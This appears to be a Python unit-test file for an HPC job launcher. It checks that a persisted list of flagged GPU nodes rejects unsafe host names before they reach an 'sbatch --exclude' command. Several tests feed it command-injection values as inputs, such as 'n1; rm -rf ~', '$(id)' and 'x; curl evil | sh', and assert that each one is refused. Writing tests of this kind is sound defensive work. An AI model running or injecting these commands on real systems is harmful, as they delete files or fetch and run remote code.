#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests for the remembered list of bad nodes.

A flagged name is later interpolated into ``sbatch --exclude=...`` on the login
node, so the store must never hold a name that is not a plausible host name --
including one planted in the settings file by hand.
"""

import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                                "hpc3_launcher"))

from PyQt5.QtCore import QSettings  # noqa: E402

from modules import node_flags as nf  # noqa: E402
from modules.vscode_helper import build_sbatch_command  # noqa: E402


class TestStoredForm(unittest.TestCase):
    def test_round_trip(self):
        flags = {"hpc3-gpu-n54-00": {"note": "GPU 2 dead", "at": "2026-11-09"}}
        self.assertEqual(nf.loads(nf.dumps(flags)), flags)

    def test_garbage_is_an_empty_list_not_a_crash(self):
        for raw in (None, "", "not json", "[1, 2]", "42", '{"a": '):
            with self.subTest(raw=raw):
                self.assertEqual(nf.loads(raw), {})

    def test_bad_entries_are_dropped_one_by_one(self):
        raw = ('{"hpc3-gpu-n54-00": {"note": "ok"}, "n1; rm -rf ~": {}, "$(id)": {},'
               ' "-leading": {}, "hpc3-gpu-n54-01": "not a dict", "": {}}')
        self.assertEqual(sorted(nf.loads(raw)), ["hpc3-gpu-n54-00", "hpc3-gpu-n54-01"])

    def test_notes_are_one_short_line(self):
        self.assertEqual(nf.clean_note("  GPU\n died\t again "), "GPU died again")
        self.assertEqual(len(nf.clean_note("x" * 500)), nf.MAX_NOTE)
        self.assertEqual(nf.clean_note(None), "")

    def test_describe(self):
        self.assertEqual(nf.describe({"note": "GPU 2 dead", "at": "2026-11-09"}),
                         "flagged Nov 9 — GPU 2 dead")
        self.assertEqual(nf.describe({"note": "", "at": ""}), "flagged")
        self.assertEqual(nf.describe({"note": "", "at": "yesterday"}), "flagged")


class TestStore(unittest.TestCase):
    def setUp(self):
        self.ini = os.path.join(tempfile.mkdtemp(prefix="hpc3-flags-"), "flags.ini")

    def store(self):
        return nf.NodeFlagStore(lambda: QSettings(self.ini, QSettings.IniFormat))

    def test_a_flag_survives_a_restart(self):
        first = self.store()
        first.flag("hpc3-gpu-n54-00", "GPU 2 dead")
        again = self.store()
        self.assertEqual(again.names(), ["hpc3-gpu-n54-00"])
        self.assertIn("GPU 2 dead", again.describe("hpc3-gpu-n54-00"))
        again.unflag("hpc3-gpu-n54-00")
        self.assertEqual(self.store().names(), [])

    def test_changed_fires_only_on_a_real_change(self):
        store, seen = self.store(), []
        store.changed.connect(lambda: seen.append(1))
        store.flag("n1")
        store.unflag("n2")              # was never flagged
        store.set_names(["n1"])         # already exactly that
        self.assertEqual(len(seen), 1)
        store.set_names(["n1", "n3"])
        store.set_names([])
        self.assertEqual(len(seen), 3)

    def test_set_names_keeps_the_notes_of_those_that_stay(self):
        store = self.store()
        store.flag("n1", "bad card")
        store.set_names(["n1", "n2"])
        self.assertIn("bad card", store.describe("n1"))
        self.assertEqual(store.names(), ["n1", "n2"])

    def test_a_hostile_name_is_refused(self):
        store = self.store()
        for name in ("n1; rm -rf ~", "$(id)", "", "a b", "-x", None, "n1,n2"):
            with self.subTest(name=name):
                with self.assertRaises(ValueError):
                    store.flag(name)
        store.set_names(["good-1", "n1; id"])
        self.assertEqual(store.names(), ["good-1"])

    def test_whatever_the_store_holds_is_safe_to_exclude(self):
        # Even a settings file edited by hand cannot get a bad name to sbatch.
        settings = QSettings(self.ini, QSettings.IniFormat)
        settings.setValue(nf.SETTINGS_KEY, '{"hpc3-gpu-n54-00": {}, "x; curl evil | sh": {}}')
        settings.sync()
        names = self.store().names()
        self.assertEqual(names, ["hpc3-gpu-n54-00"])
        command = build_sbatch_command(account="pi_lab_gpu", use_free=True, family="gpu32",
                                       gpu_type="", exclude_nodes=names)
        self.assertIn(" --exclude=hpc3-gpu-n54-00", command)


if __name__ == "__main__":
    unittest.main()
